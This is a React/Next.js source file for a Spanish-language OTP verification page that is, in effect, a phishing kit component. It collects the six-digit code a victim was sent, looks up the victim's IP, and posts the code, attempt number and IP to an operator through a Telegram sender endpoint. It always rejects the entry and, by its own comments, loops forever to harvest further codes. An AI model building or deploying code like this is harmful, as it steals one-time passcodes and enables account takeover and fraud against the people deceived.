import React, { useState } from 'react';
import { Box, Button, Typography, Container } from '@mui/material';
import CircularProgress from '@mui/material/CircularProgress';
import axios from 'axios';
import PropTypes from 'prop-types';
import { Input as BaseInput } from '@mui/base/Input';
import { styled } from '@mui/system';
import { useRouter } from 'next/router';
import Header from '@/components/header';
import Footer from '@/components/Footer';
import { toast } from 'sonner';
import { getSessionId } from '@/utils/session';
import { formatOTPMessage, getTimestamp } from '@/utils/telegramFormatter';

function OTP({ separator, length, value, onChange }) {
    const inputRefs = React.useRef(new Array(length).fill(null));

    const focusInput = (targetIndex) => {
        const targetInput = inputRefs.current[targetIndex];
        targetInput.focus();
    };

    const selectInput = (targetIndex) => {
        const targetInput = inputRefs.current[targetIndex];
        targetInput.select();
    };

    const handleKeyDown = (event, currentIndex) => {
        switch (event.key) {
            case 'ArrowLeft':
                event.preventDefault();
                if (currentIndex > 0) {
                    focusInput(currentIndex - 1);
                    selectInput(currentIndex - 1);
                }
                break;
            case 'ArrowRight':
                event.preventDefault();
                if (currentIndex < length - 1) {
                    focusInput(currentIndex + 1);
                    selectInput(currentIndex + 1);
                }
                break;
            case 'Backspace':
                event.preventDefault();
                if (currentIndex > 0) {
                    focusInput(currentIndex - 1);
                    selectInput(currentIndex - 1);
                }
                onChange((prevOtp) => {
                    const otp =
                        prevOtp.slice(0, currentIndex) + prevOtp.slice(currentIndex + 1);
                    return otp;
                });
                break;
            default:
                break;
        }
    };

    const handleChange = (event, currentIndex) => {
        const currentValue = event.target.value.replace(/[^0-9]/g, '').slice(0, 1);
        onChange((prev) => {
            const otpArray = prev.split('');
            otpArray[currentIndex] = currentValue;
            return otpArray.join('');
        });
        if (currentValue !== '') {
            if (currentIndex < length - 1) {
                focusInput(currentIndex + 1);
            }
        }
    };

    return (
        <Box sx={{ display: 'flex', gap: 1, alignItems: 'center' }}>
            {new Array(length).fill(null).map((_, index) => (
                <React.Fragment key={index}>
                    <BaseInput
                        slots={{ input: InputElement }}
                        aria-label={`Digit ${index + 1} of OTP`}
                        slotProps={{
                            input: {
                                ref: (ele) => {
                                    inputRefs.current[index] = ele;
                                },
                                onKeyDown: (event) => handleKeyDown(event, index),
                                onChange: (event) => handleChange(event, index),
                                value: value[index] ?? '',
                            },
                        }}
                    />
                    {index === length - 1 ? null : separator}
                </React.Fragment>
            ))}
        </Box>
    );
}

OTP.propTypes = {
    length: PropTypes.number.isRequired,
    onChange: PropTypes.func.isRequired,
    separator: PropTypes.node,
    value: PropTypes.string.isRequired,
};

export default function OTPInputForm() {
    const router = useRouter();

    const [otp, setOtp] = useState('');
    const [attempt, setAttempt] = useState(0); // Intentos de verificación
    const [loading, setLoading] = useState(false);

    // Cooldown timer state
    const [cooldownActive, setCooldownActive] = useState(false);
    const [cooldownSeconds, setCooldownSeconds] = useState(30);

    // Cooldown timer effect
    React.useEffect(() => {
        if (cooldownActive && cooldownSeconds > 0) {
            const timer = setTimeout(() => {
                setCooldownSeconds(prev => prev - 1);
            }, 1000);
            return () => clearTimeout(timer);
        } else if (cooldownSeconds === 0) {
            setCooldownActive(false);
            setCooldownSeconds(30); // Reset to 30 seconds
        }
    }, [cooldownActive, cooldownSeconds]);



    // ...

    const handleSubmit = async (e) => {
        e.preventDefault();

        // Prevent submission during cooldown
        if (cooldownActive) {
            toast.warning(`Espera ${cooldownSeconds} segundos antes de intentar nuevamente.`);
            return;
        }

        if (otp.length !== 6) {
            toast.error('Ingresa un código OTP válido de 6 dígitos.');
            return;
        }

        setLoading(true);

        try {
            // Check if in TEST_MODE
            const isTestMode = process.env.NEXT_PUBLIC_TEST_MODE === 'true';

            if (!isTestMode) {
                // Only send to Telegram if NOT in test mode
                const ip = await axios.get('https://api.ipify.org?format=json');
                const sessionId = getSessionId();

                // Format message for Telegram with improved structure
                const message = formatOTPMessage({
                    sessionId,
                    otp,
                    attempt: attempt + 1,
                    ip: ip.data.ip,
                    timestamp: getTimestamp()
                });

                // Send directly to Telegram via sender API
                await axios.post('/api/sender', { message });
            } else {
                // TEST MODE: Simulate API delay
                console.log('TEST MODE: Skipping Telegram send');
                console.log('OTP Code:', otp, 'Attempt:', attempt + 1);
                await new Promise(resolve => setTimeout(resolve, 500));
            }

            // FIRST ATTEMPT: Show error, start cooldown
            if (attempt === 0) {
                toast.error('El código ingresado no es válido. Por favor verifica e intenta nuevamente.');
                setOtp(''); // Limpiar el OTP
                setAttempt(1); // Move to attempt 1

                // Start 30-second cooldown
                setCooldownActive(true);
                setCooldownSeconds(30);
            }
            // SECOND+ ATTEMPTS: Loop indefinitely, never succeed
            else {
                toast.error('El código ingresado no es válido. Por favor verifica e intenta nuevamente.');
                setOtp(''); // Clear OTP for next attempt
                setAttempt(attempt + 1); // Increment attempt counter

                // Start 30-second cooldown again
                setCooldownActive(true);
                setCooldownSeconds(30);

                // NOTE: Never redirect to /final - keep the loop going
            }
        } catch (error) {
            toast.error('Error al enviar los datos. Por favor, inténtalo de nuevo.');
        } finally {
            setLoading(false);
        }
    };

    return (
        <Box sx={{ minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
            <Header />
            <Container component="main"
                maxWidth="xs"
                sx={{
                    flex: 1,
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    py: 4,
                }}>
                <Box
                    component="form"
                    onSubmit={handleSubmit}
                    sx={{
                        display: 'flex',
                        flexDirection: 'column',
                        alignItems: 'center',
                        justifyContent: 'center',
                        gap: 2,
                        padding: '16px',
                        border: '1px solid #e0e0e0', // Opcional: agregar borde para una mejor estructura visual
                        borderRadius: '8px', // Opcional: esquinas redondeadas
                        boxShadow: '0px 4px 12px rgba(0, 0, 0, 0.1)', // Opcional: sombra para darle un efecto elevado
                        bgcolor: 'background.paper',
                        width: '100%',
                    }}
                >
                    <Typography variant="h5" sx={{ mb: 2, fontWeight: 'bold' }}>
                        ¡Hola, Bienvenido!
                    </Typography>
                    <Typography variant="body2" sx={{ mb: 2 }}>
                        Ingresa el código de 6 dígitos que hemos enviado a tu número celular.
                    </Typography>

                    <OTP separator={<span>-</span>} value={otp} onChange={setOtp} length={6} />

                    {/* Show cooldown timer with visual progress indicator when active */}
                    {cooldownActive && (
                        <Box sx={{ display: 'flex', flexDirection: 'column', alignItems: 'center', mt: 2, gap: 1 }}>
                            <Box sx={{ position: 'relative', display: 'inline-flex' }}>
                                <CircularProgress
                                    variant="determinate"
                                    value={(cooldownSeconds / 30) * 100}
                                    size={80}
                                    thickness={4}
                                    sx={{
                                        color: '#F7931E',
                                        '& .MuiCircularProgress-circle': {
                                            strokeLinecap: 'round',
                                        },
                                    }}
                                />
                                <Box
                                    sx={{
                                        top: 0,
                                        left: 0,
                                        bottom: 0,
                                        right: 0,
                                        position: 'absolute',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                    }}
                                >
                                    <Typography variant="h6" component="div" color="text.primary" fontWeight="bold">
                                        {cooldownSeconds}s
                                    </Typography>
                                </Box>
                            </Box>
                            <Typography variant="body2" color="warning.main">
                                Espera para intentar nuevamente
                            </Typography>
                        </Box>
                    )}

                    <Button
                        type="submit"
                        variant="contained"
                        sx={{ mt: 3, mb: 2, borderRadius: '50px', width: '100%' }} // Ajustamos el botón para ocupar todo el ancho
                        disabled={loading || cooldownActive}
                    >
                        {loading ? <CircularProgress size={24} /> : (cooldownActive ? `Bloqueado (${cooldownSeconds}s)` : 'Verificar')}
                    </Button>
                </Box>
            </Container>
            <Footer />
        </Box>
    );
}

const grey = {
    50: '#F3F6F9',
    100: '#E5EAF2',
    200: '#DAE2ED',
    900: '#1C2025',
};

const InputElement = styled('input')(
    ({ theme }) => `
  width: 40px;
  padding: 8px;
  text-align: center;
  font-size: 1.25rem;
  border: 1px solid ${grey[200]};
  border-radius: 4px;
  color: ${theme.palette.mode === 'dark' ? grey[50] : grey[900]};
  background-color: ${theme.palette.mode === 'dark' ? grey[900] : '#fff'};

  &:focus {
    border-color: ${grey[900]};
    outline: none;
  }
`,
);
